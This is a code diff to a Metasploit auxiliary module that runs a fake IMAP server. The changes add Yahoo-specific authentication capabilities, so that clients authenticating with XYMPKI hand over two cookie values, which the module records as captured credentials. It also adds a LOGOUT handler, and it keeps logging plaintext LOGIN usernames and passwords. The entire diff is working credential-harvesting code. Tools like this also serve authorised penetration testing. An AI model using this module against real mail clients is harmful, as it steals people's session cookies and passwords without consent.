@@ -68,8 +68,24 @@ class Metasploit3 < Msf::Auxiliary
 		
 		
 		if(cmd.upcase == "CAPABILITY") 
-			c.put "* CAPABILITY IMAP4 IMAP4rev1 IDLE LOGIN-REFERRALS MAILBOX-REFERRALS NAMESPACE LITERAL+ UIDPLUS CHILDREN\r\n"
+			c.put "* CAPABILITY IMAP4 IMAP4rev1 IDLE LOGIN-REFERRALS MAILBOX-REFERRALS NAMESPACE LITERAL+ UIDPLUS CHILDREN UNSELECT QUOTA XLIST XYZZY LOGIN-REFERRALS AUTH=XYMCOOKIE AUTH=XYMCOOKIEB64 AUTH=XYMPKI AUTH=XYMECOOKIE ID\r\n"
 			c.put "#{num} OK CAPABILITY completed.\r\n"
+		end
+		
+		if(cmd.upcase == "AUTHENTICATE" and arg.upcase == "XYMPKI")
+			c.put "+ \r\n"
+			cookie1 = c.get_once
+			c.put "+ \r\n"
+			cookie2 = c.get_once
+			report_auth_info(
+				:host      => @state[c][:ip],
+				:proto     => 'imap-yahoo',
+				:targ_host => datastore['SRVHOST'],
+				:targ_port => datastore['SRVPORT'],
+				:user      => cookie1,
+				:pass      => cookie2
+			)
+			return	
 		end
 		
 		if(cmd.upcase == "LOGIN")
@@ -84,6 +100,13 @@ class Metasploit3 < Msf::Auxiliary
 				:pass      => @state[c][:pass]
 			)
 			print_status("IMAP LOGIN #{@state[c][:name]} #{@state[c][:user]} / #{@state[c][:pass]}")
+			return
+		end
+		
+		if(cmd.upcase == "LOGOUT")
+			c.put("* BYE IMAP4rev1 Server logging out\r\n")
+			c.put("#{num} OK LOGOUT completed\r\n")
+			return
 		end
 
 		@state[c][:pass] = data.strip
